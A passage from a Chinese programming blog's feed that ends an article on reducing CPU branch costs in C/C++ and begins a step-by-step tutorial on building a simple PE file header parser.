class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> animation&amp; a: animation_list) {<br>   a.step_a();<br>   <span class="hljs-keyword">if</span> (a.is_visible()) {<br>      a.step_av();<br>   }<br>   a.step_b();<br>   <span class="hljs-keyword">if</span> (a.is_visible) {<br>       a.step_bv();<br>}<br></code></pre></td></tr></tbody></table></figure><p>一种优化的思路是：根据<code>is_visible()</code>函数的结果对<code>animation_list</code>中的数据进行排序，比如说最前面放置可见的实例，后面放置隐藏的实例，并使用一个变量记录分割点；</p><p>另一种优化思路是：使用额外的两个数组来分别存放可见和隐藏的实例，animation_list_visible 和 animation_list_hidden，重写后的代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> animation&amp; a: animation_list_visible) {<br>   a.step_a();<br>   a.step_av();<br>   a.step_b();<br>   a.step_bv();<br>}<br><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> animation&amp; a: animation_list_hidden) {<br>   a.step_a();<br>   a.step_b();<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="使用模板删除分支"><a href="#使用模板删除分支" class="headerlink" title="使用模板删除分支"></a>使用模板删除分支</h3><p>如果一个布尔型变量被传给函数且作为函数的一个参数，那么可以通过传递一个模板参数来消除函数的参数，e.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">average</span><span class="hljs-params">(<span class="hljs-type">int</span>* <span class="hljs-built_in">array</span>, <span class="hljs-type">int</span> len, <span class="hljs-type">bool</span> include_negatives)</span> {<br>    <span class="hljs-type">int</span> average = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {<br>        <span class="hljs-keyword">if</span> (include_negatives) {<br>            average += <span class="hljs-built_in">array</span>[i];<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">array</span>[i] &gt; <span class="hljs-number">0</span>) {<br>                average += <span class="hljs-built_in">array</span>[i];<br>                count++;<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">if</span> (include_negatives) {<br>         <span class="hljs-keyword">return</span> average / len;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">return</span> average / count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>在这个函数中，包含<code>include_negatives</code>的条件可能会被计算很多次，传递一个模板参数而不是函数参数可以有效的减少这类计算，如：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">template &lt;<span class="hljs-type">bool</span> include_negatives&gt;<br><span class="hljs-type">int</span> <span class="hljs-title function_">average</span><span class="hljs-params">(<span class="hljs-type">int</span>* <span class="hljs-built_in">array</span>, <span class="hljs-type">int</span> len)</span> {<br>    <span class="hljs-type">int</span> average = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {<br>        <span class="hljs-keyword">if</span> (include_negatives) {<br>            average += <span class="hljs-built_in">array</span>[i];<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">array</span>[i] &gt; <span class="hljs-number">0</span>) {<br>                average += <span class="hljs-built_in">array</span>[i];<br>                count++;<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">if</span> (include_negatives) {<br>         <span class="hljs-keyword">return</span> average / len;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">return</span> average / count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>编译器会为上述代码生成两个版本的函数，一个是include_negatives为真时的代码，一个是为假时的代码。这样一来，分支就完全消失了，未使用的分支中的代码也消失了。但需要注意的是，在调用时有略微的不同：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> avg;<br><span class="hljs-type">bool</span> should_include_negatives = get_should_include_negatives();<br><span class="hljs-keyword">if</span> (should_include_negatives) {<br>    avg = average&lt;<span class="hljs-literal">true</span>&gt;(<span class="hljs-built_in">array</span>, len);<br>} <span class="hljs-keyword">else</span> {<br>    avg = average&lt;<span class="hljs-literal">false</span>&gt;(<span class="hljs-built_in">array</span>, len);<br>}<br></code></pre></td></tr></tbody></table></figure><p>以上其实是一种叫<em>branch optiomization</em>的编译器优化技术。如果include_negatives值在编译时是已经得，那么编译器将决定内联函数，并删除分支以及未使用的代码。但是，带模板的这一版代码能够保证上述过程，而原始版的代码并不一定能够保证上述过程。</p><h3 id="其他的一些技巧来避免分支"><a href="#其他的一些技巧来避免分支" class="headerlink" title="其他的一些技巧来避免分支"></a>其他的一些技巧来避免分支</h3><p>如果代码中检查了若干次不可变条件，那么你可以通过进行代码拷贝的方式获得更好的性能，e.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (is_visible) {<br>    hide();<br>}<br>process();<br><span class="hljs-keyword">if</span> (is_active) {<br>    display();<br>}<br></code></pre></td></tr></tbody></table></figure><p>如下重写：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (is_visible) {<br>    hide();<br>    process();<br>    display();<br>} <span class="hljs-keyword">else</span> {<br>    process();<br>}<br></code></pre></td></tr></tbody></table></figure><hr><p>你也可以引入两个元素的数组，一个用于存放条件为真的结果，另一个用于存放条件为假的结果，e.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (is_visible) {<br>    hide();<br>    process();<br>    display();<br>} <span class="hljs-keyword">else</span> {<br>    process();<br>}<br></code></pre></td></tr></tbody></table></figure><p>如下重写：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> result[] = { <span class="hljs-number">0</span>, <span class="hljs-number">0</span> };<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {<br>    result[a&gt;i]++;<br>}<br><span class="hljs-keyword">return</span> result[<span class="hljs-number">1</span>];<br></code></pre></td></tr></tbody></table></figure><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><ul><li>本文主要从<strong>CPU</strong>（包括一些优化技术）及<strong>汇编</strong>的角度重新审视代码中分支对于程序运行性能上的影响，并在第5节中提出了一些优化程序运行性能的技巧，这些技巧的主要见解有两个：一是<strong>减少程序中分支数</strong>，二是<strong>前置高概率分支</strong>；</li><li><a href="https://johnnysswlab.com/how-branches-influence-the-performance-of-your-code-and-what-can-you-do-about-it/">How branches influence the performance of your code and what can you do about it? - Johnny’s Software Lab (johnnysswlab.com)</a>这篇文章对不同的CPU做了一些实验来验证上述技巧的有效性，本文并没有花过多的时间进行介绍，感兴趣的可以去阅读一下原文；</li><li>本文介绍了很多使程序运行更快的技巧，然而这些技巧与使用场景也是密切相关的，需要在今后的工程实践中加以理解使用；此外需要注意的是，这些技巧并总是有效，例如某些技巧可能会降低代码的可阅读性等。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>性能优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一步一步”手搓“一个简单的PE解析器</title>
    <link href="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/"/>
    <url>/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="一步一步”手搓“一个简单的PE解析器"><a href="#一步一步”手搓“一个简单的PE解析器" class="headerlink" title="一步一步”手搓“一个简单的PE解析器"></a>一步一步”手搓“一个简单的PE解析器</h1><ul><li>本文主要通过编写一个简单的PE解析器来加强对于PE结构的理解</li><li>项目地址：<a href="https://github.com/bladchan/Simple-PE-Parser">bladchan/Simple-PE-Parser: A simple tool for parsing PE file (github.com)</a></li></ul><h2 id="Step-0-预备工作"><a href="#Step-0-预备工作" class="headerlink" title="Step 0: 预备工作"></a>Step 0: 预备工作</h2><ul><li>了解PE文件结构，参考资料[1-7]均介绍了PE的结构，这里不再赘述</li><li><code>winnt.h</code>，该头文件包含了很多PE文件格式中的结构体：<a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h">https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h</a></li><li>开源项目：<a href="https://github.com/hasherezade/pe-bear">https://github.com/hasherezade/pe-bear</a></li></ul><h2 id="Step-1-简单的识别PE文件与其类型"><a href="#Step-1-简单的识别PE文件与其类型" class="headerlink" title="Step 1: 简单的识别PE文件与其类型"></a>Step 1: 简单的识别PE文件与其类型</h2><ul><li><p>本节主要解决一个事，那就是确定给定的文件是否是一个PE文件</p></li><li><p>一个PE文件至少要满足两个条件：</p><ul><li><code>DOS Header</code>的标志<code>MZ</code><ul><li>识别：文件前两个字节对应<code>MZ</code>的ASCII（0x5A4D）</li><li><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/1.png"></li></ul></li><li><code>NT Header</code>的标志<code>PE</code><ul><li>识别：1. 获取DOS Header的指向<code>NT Headers</code>首部的偏移值；2. 取出前四个字节，并判断是否为<code>50 45 00 00</code>；</li><li><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/2.png"></li><li><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/3.png"></li></ul></li></ul></li><li><p>接下来判断一下PE文件的类型，主要是通过<code>NT Headers</code>的<code>Optional Header</code>进行识别：</p><ul><li><code>Optional Header</code>：<ul><li>主要看Magic字段（两个字节）：<code>0x10b ==&gt; NT32</code>，<code>0x20b ==&gt; NT64</code></li><li><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/4.png"></li></ul></li></ul></li></ul><hr><ul><li>代码：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pe_validate</span><span class="hljs-params">(FILE* file)</span> </span>{<br><span class="hljs-comment">/*  </span><br><span class="hljs-comment">*  此函数用于检查传入文件是否为PE文件</span><br><span class="hljs-comment">*  参数1是传入的PE文件FILE指针</span><br><span class="hljs-comment">*  返回值：-1表示文件损坏（针对PE文件来说）；0表示不是合法的PE文件；否则返回PE文件的类型（32 -&gt; PE32; 64 -&gt; PE+/PE32+; 1 -&gt; ROM?）</span><br><span class="hljs-comment">*/</span><br><br>__IMAGE_DOS_HEADER dos_header;<br>DWORD sig;<br>WORD pefile_type;<br><br><span class="hljs-built_in">fseek</span>(file, <span class="hljs-number">0</span>, SEEK_SET);<br><span class="hljs-type">size_t</span> read_size = <span class="hljs-built_in">fread</span>(&amp;dos_header, <span class="hljs-built_in">sizeof</span>(__IMAGE_DOS_HEADER), <span class="hljs-number">1</span>, file);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">// 检查PE文件的MS标志</span><br><span class="hljs-keyword">if</span> (dos_header.e_magic != ___IMAGE_DOS_SIGNATURE) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Not a PE file.\n"</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-comment">// 检查NT Header的PE标志</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">fseek</span>(file, dos_header.e_lfanew, SEEK_SET)) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-built_in">fread</span>(&amp;sig, <span class="hljs-built_in">sizeof</span>(DWORD), <span class="hljs-number">1</span>, file);<br><span class="hljs-keyword">if</span> (sig != ___IMAGE_NT_SIGNATURE) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Not a PE file.\n"</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">fseek</span>(file, dos_header.e_lfanew + <span class="hljs-built_in">sizeof</span>(DWORD) + <span class="hljs-built_in">sizeof</span>(___IMAGE_FILE_HEADER), SEEK_SET)) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>read_size = <span class="hljs-built_in">fread</span>(&amp;pefile_type, <span class="hljs-built_in">sizeof</span>(WORD), <span class="hljs-number">1</span>, file);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-comment">// 匹配PE文件的类型</span><br><span class="hljs-keyword">switch</span> (pefile_type) {<br><span class="hljs-keyword">case</span> ___IMAGE_NT_OPTIONAL_HDR32_MAGIC:<br><span class="hljs-keyword">return</span> <span class="hljs-number">32</span>;<br><span class="hljs-keyword">case</span> ___IMAGE_NT_OPTIONAL_HDR64_MAGIC:<br><span class="hljs-keyword">return</span> <span class="hljs-number">64</span>;<br><span class="hljs-keyword">case</span> ___IMAGE_ROM_OPTIONAL_HDR_MAGIC:<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">default</span>: {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error when parsing ___IMAGE_OPTIONAL_HEADER.Magic. Unknown Type.\n"</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br>}<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>测试：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    FILE* fp;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;fp, <span class="hljs-string">"PATH_TO_PE_FILE"</span>, <span class="hljs-string">"r"</span>);<br>    std::cout &lt;&lt; <span class="hljs-built_in">pe_validate</span>(fp) &lt;&lt; <span class="hljs-string">'\n'</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>输出结果为64，表示该PE文件类型为<code>PE32+</code></p><h2 id="Step-2-解析PE32文件头"><a href="#Step-2-解析PE32文件头" class="headerlink" title="Step 2: 解析PE32文件头"></a>Step 2: 解析PE32文件头</h2><ul><li><p><code>PE32</code>和<code>PE32+</code>仅在位长上存在差异，整体处理逻辑是无任何区别的；</p></li><li><p><code>PE32</code>文件主要包括的结构有：</p><ul><li><code>DOS header</code></li><li><code>DOS Stub (Rich Header)</code></li><li><code>NT Headers (File Header、Optional Header)</code></li><li><code>Section Headers</code></li><li>…（请注意，我们这里仅仅是设计一个简单的解析器，解析的功能可能并不完善，仅用于加深对PE文件格式的理解）</li></ul></li><li><p><code>PE32</code>文件结构类的设计：</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PE32</span> {<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">PE32</span>(<span class="hljs-type">char</span>*, FILE*);<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_info</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-comment">// 基础的成员变量</span><br><span class="hljs-type">char</span>* file_path;<br>FILE* pe_fp;<br><br><span class="hljs-comment">// PE相关头</span><br>___IMAGE_DOS_HEADER         pe_dos_header;<br>___IMAGE_NT_HEADERS32       pe_nt_headers_32;<br>___PIMAGE_OPTIONAL_HEADER32 nt_optional_headers;<br>___PIMAGE_SECTION_HEADER    section_headers;<br>___PIMAGE_IMPORT_DESCRIPTOR import_dir_table_entries;<br>___IMAGE_EXPORT_DIRECTORY   export_dir_table;<br>___PIMAGE_BASE_RELOCATION   basereloc_table;<br>___IMAGE_RESOURCE_DIRECTORY resource_dir_root;<br><br><span class="hljs-comment">// PE相关头中的偏移量和变量</span><br>WORD  nt_headers_machine;<br>LONG  nt_headers_offset;<br>WORD  nt_sections_cnt;<br>WORD  nt_optional_header_size;<br>WORD  nt_characteristics;<br>DWORD pe_header_size;<br>DWORD import_dir_table_rva;<br>DWORD import_dir_table_size;<br>DWORD export_dir_table_rva;<br>DWORD export_dir_table_size;<br>DWORD basereloc_dir_table_rva;<br>DWORD basereloc_dir_table_size;<br>DWORD resource_dir_table_rva;<br>DWORD resource_dir_table_size;<br><br><span class="hljs-comment">// 辅助变量</span><br>DWORD import_dir_table_entries_num;<br>DWORD basereloc_table_num;<br><br><span class="hljs-comment">// 与Rich headers有关的相关变量</span><br>RICH_HEADER rich_headers;<br><br><span class="hljs-comment">// 辅助函数，用于转化相关地址</span><br><span class="hljs-function">DWORD <span class="hljs-title">va_to_raw</span><span class="hljs-params">(DWORD)</span></span>;<br><br><span class="hljs-comment">// 解析相关的函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_file</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_dos_header</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_dos_stub</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_nt_headers</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_section_headers</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_import_directory</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_export_directory</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_basereloc_table</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parse_resources_table</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-comment">// 打印相关的函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_file_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_dos_header_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_dos_stub_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_nt_headers_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_section_headers_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_import_table_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_export_table_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_basereloc_table_info</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_resources_table_info</span><span class="hljs-params">()</span></span>;<br><br>};<br></code></pre></td></tr></tbody></table></figure><h3 id="Step-2-1-解析DOS-Header"><a href="#Step-2-1-解析DOS-Header" class="headerlink" title="Step 2.1: 解析DOS Header"></a>Step 2.1: 解析DOS Header</h3><ul><li>在类中维护一个<code>IMAGE_DOS_HEADER</code>的变量<code>pe_dos_header</code>，然后从文件中将相应数据读入到该成员变量即可。同时我们这里在类中维护了一个<code>nt_headers_offset</code>的成员变量，用于记录<code>NT Headers</code>的偏移值。</li><li>代码：</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">PE32::parse_dos_header</span><span class="hljs-params">()</span><br>{<br><br>fseek(pe_fp, <span class="hljs-number">0</span>, SEEK_SET);<br>fread(&amp;pe_dos_header, <span class="hljs-keyword">sizeof</span>(___IMAGE_DOS_HEADER), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-comment">// 这里不需要检查读入字节数，因为之前已经调用过 `pe_validate()` 了，</span><br><span class="hljs-comment">// 因此这里一定能够读入 `sizeof(___IMAGE_DOS_HEADER)` 个字节</span><br><br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PE32::print_dos_header_info</span><span class="hljs-params">()</span><br>{<br>nt_headers_offset = pe_dos_header.e_lfanew;<br><br><span class="hljs-comment">// 为了简化，我们这里只打印一些主要信息</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"======DOS Header======\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"Magic number: %04X\n"</span>, pe_dos_header.e_magic);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"File address of new exe header: %X\n"</span>, pe_dos_header.e_lfanew);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">"\n==========END==========\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>运行结果：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/5.png"></p><hr><h3 id="Step-2-2-解析DOS-Stub（Rich-headers）"><a href="#Step-2-2-解析DOS-Stub（Rich-headers）" class="headerlink" title="Step 2.2: 解析DOS Stub（Rich headers）"></a>Step 2.2: 解析DOS Stub（Rich headers）</h3><ul><li><p>这一部分主要解析<code>DOS Stub</code>中的<code>Rich headers</code>。请注意，暂无文档说明过<code>Rich headers</code>是包含在<code>DOS Stub</code>内的，但<code>Rich headers</code>所处的位置确实介于<code>PE</code>头和<code>DOS</code>头之间的，因此本文不严谨的将<code>Rich headers</code>包含在<code>DOS Stub</code>内部</p></li><li><p>什么是<code>Rich headers</code>？</p><ul><li><code>Rich headers</code>可以理解为存储着开发环境信息的一段指纹[10]，或用于帮助诊断和调试</li><li><code>Rich headers</code>使用<code>XOR Key</code>对<code>Rich headers</code>中的每4个字节进行了异或加密</li><li><code>Rich headers</code>的结构如下图所示：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/6.png"></p></li><li><p>如何定位<code>Rich 